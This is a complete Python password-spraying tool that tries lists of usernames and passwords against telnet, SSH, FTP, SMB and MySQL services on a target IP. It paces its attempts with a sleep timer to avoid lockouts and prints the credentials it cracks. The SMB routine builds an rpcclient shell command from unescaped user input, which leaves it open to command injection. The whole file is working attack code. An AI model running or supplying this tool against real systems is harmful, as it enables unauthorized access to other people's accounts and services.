#!/usr/bin/python3
#FOR READMER
#pip3 install mysql-connector
import argparse
import time
import telnetlib
import paramiko
import os
import mysql.connector
import ftplib

#lists
user_list = list()
pass_list = list()
valid_creds = list()
#Pretty messages
def pGreen(value): return '\033[92m{}\033[00m'.format(value)
def pRed(value): return '\033[91m{}\033[00m'.format(value)
def pWarning(value): return '\033[93m{}\033[00m'.format(value)
#Arguments
parser = argparse.ArgumentParser()
parser.add_argument('protocol', type=str,help='Protocol to perform the spray (telnet,ssh,ftp,smb,mysql)')
parser.add_argument('ip',help='The ip to perform the spray')
parser.add_argument('-p','--port',type=int)
parser.add_argument('users',help='Users list (one per line)')
parser.add_argument('passwords', help='Passwords list (one per line)')
parser.add_argument('attemps', type=int,help='The amount of attemps before the timer starts')
parser.add_argument('timer', type=int,help='The sleep time (minutes)')
args = parser.parse_args()
ip = args.ip
prot = args.protocol
max_attemps = args.attemps
timer = args.timer
spec_port = args.port

with open(args.users, 'r') as u_file:
	for u in u_file.readlines():
		user_list.append(u.replace('\n',''))
with open(args.passwords,'r') as p_file:
	for p in p_file.readlines():
		pass_list.append(p.replace('\n',''))

def ftp_connect(user,password):
	msg = '[*] Trying with {}:{}'.format(user,password)
	ftp_p = spec_port if spec_port else 21
	try:
		ftp = ftplib.FTP()
		ftp.connect(ip,ftp_p)
		ftp.login(user,password)
		ftp.quit()
		msg += pGreen(' -> Success!!!')
		valid_creds.append(user+':'+password)
		print(msg)
		return True
	except ftplib.error_perm:
		msg += pRed(' -> Failed!!!')
		pass
	print(msg)
	return False

def telnet_connect(user,password):
	msg = '[*] Trying with {}:{}'.format(user,password)
	u = (user+'\n').encode('utf-8')
	p = (password+'\n').encode('utf-8')
	telnet_p = spec_port if spec_port else 23
	tn = telnetlib.Telnet(ip,telnet_p)
	tn.read_until('login: '.encode('utf-8'))
	tn.write(u)
	tn.read_until('Password: '.encode('utf-8'))
	tn.write(p)
	tn.read_some()#\r\n
	return_message = tn.read_some().decode('utf-8')
	tn.close()
	if 'Login incorrect' not in return_message and return_message:
		valid_creds.append(user+':'+password)
		msg += pGreen(' -> Success!!!')
		print(msg)
		return True
	else:
		msg += pRed(' -> Failed!!!')
		print(msg)
		return False

def ssh_connect(user,password):
	msg = '[*] Trying with {}:{}'.format(user,password)
	ssh_p = spec_port if spec_port else 22
	try:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(ip, ssh_p, user, password)
		ssh.close()
		valid_creds.append(user+':'+password)
		msg += pGreen(' -> Success!!!')
		print(msg)
		return True
	except paramiko.ssh_exception.SSHException as e:
		if 'Error reading SSH protocol banner' in str(e):
			print(pWarning('Carefull to many requests performed on the server try adding more time!!'))
		msg += pRed(' -> Failed!!!')
		pass
	except paramiko.AuthenticationException:
		msg += pRed(' -> Failed!!!')
		pass
	except Exception:
		msg += pRed(' -> Failed!!!')
		pass
	print(msg)
	return False

def smb_connect(user,password):
	msg = '[*] Trying with {}:{}'.format(user,password)
	result = os.popen( 'rpcclient -U "{}%{}" -c "getusername;quit" {}'.format(user,password,ip)).read()
	if not 'NT_STATUS_LOGON_FAILURE' in result:
		valid_creds.append(user+':'+password)
		msg += pGreen(' -> Success!!!')
		print(msg)
		return True
	else:
		msg += pRed(' -> Failed!!!')
		print(msg)
		return False

def mysql_connect(user,password):
	msg = '[*] Trying with {}:{}'.format(user,password)
	mysql_p = spec_port if spec_port else 3306
	try:
		mydb = mysql.connector.connect(host=ip,user=user,password=password,port=mysql_p)
		cursor = mydb.cursor()
		cursor.execute("SHOW DATABASES;")
		mydb.close()
		valid_creds.append(user+':'+password)
		msg += pGreen(' -> Success!!!')
		print(msg)
		return True
	except mysql.connector.errors.DatabaseError:
		msg += pRed(' -> Failed!!!')
		pass
	print(msg)
	return False

def spray():
	c_attemps = 0
	user_remove = ''
	success = False
	for p in pass_list:
		if c_attemps == max_attemps:
			print(pWarning('Going to sleep for {} minutes'.format(timer)))
			time.sleep(timer*60)
			c_attemps = 0
			print(pWarning('Back on spray'))
		for u in user_list:
			if 'ftp' == prot:
				success = ftp_connect(u,p)
			elif 'ssh' == prot:
				success = ssh_connect(u,p)
			elif 'telnet' == prot:
				success = telnet_connect(u,p)
			elif 'mysql' == prot:
				success = mysql_connect(u,p)
			else:
				success = smb_connect(u,p)
			if success:
				user_remove = u
		if user_remove:	
			user_list.remove(user_remove)
			user_remove = ''
		c_attemps+= 1

	if len(valid_creds)>0:
		print(pGreen('creds Pwned:'))
		print(''.join(creds+'\n' for creds in valid_creds))
	else:
		print('No valid creds found')
	return

if __name__ == '__main__':
	spray()